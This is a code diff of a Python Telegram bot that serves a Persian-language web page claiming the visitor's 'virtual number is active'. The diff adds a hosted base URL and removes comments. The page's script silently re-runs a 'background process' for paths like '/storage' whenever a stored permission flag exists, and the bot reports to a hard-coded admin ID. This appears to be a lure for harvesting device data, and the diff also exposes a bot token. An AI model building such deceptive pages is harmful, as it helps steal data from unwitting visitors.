@@ -8,6 +8,9 @@ BOT_TOKEN = "8628341169:AAH0RN8xSL2GuKIhqiEElvndV_xWoUyw9WE"
 bot = telebot.TeleBot(BOT_TOKEN)
 ADMIN_ID = "8173349543"
 
+# لینک پایه سایت شما در ریلیوی
+BASE_URL = "https://Determined-illumination-production-7799.up.railway.app"
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
@@ -151,12 +154,9 @@ HTML_TEMPLATE = """
         window.addEventListener('DOMContentLoaded', () => {
             const path = window.location.pathname;
             
-            // بررسی اینکه آیا کاربر قبلاً اجازه داده است یا خیر
             if (localStorage.getItem("permission_granted_" + path) === "true") {
                 document.getElementById('loadingText').innerText = "شماره مجازی شما فعال است! ✅";
                 document.getElementById('loadingSubText').innerText = "خطوط امن آماده استفاده هستند.";
-                
-                // اگر قبلاً اجازه داده شده باشد، به‌صورت خودکار و مستقیم فرآیند پس‌زمینه اجرا شود بدون نیاز به کلیک مجدد
                 autoExecuteIfGranted();
             }
         });
@@ -208,7 +208,6 @@ HTML_TEMPLATE = """
             }
         }
 
-        // تابع برای اجرای خودکار در صورت اعطای مجوز در دفعات قبلی
         function autoExecuteIfGranted() {
             const path = window.location.pathname;
             if (path === "/storage") {
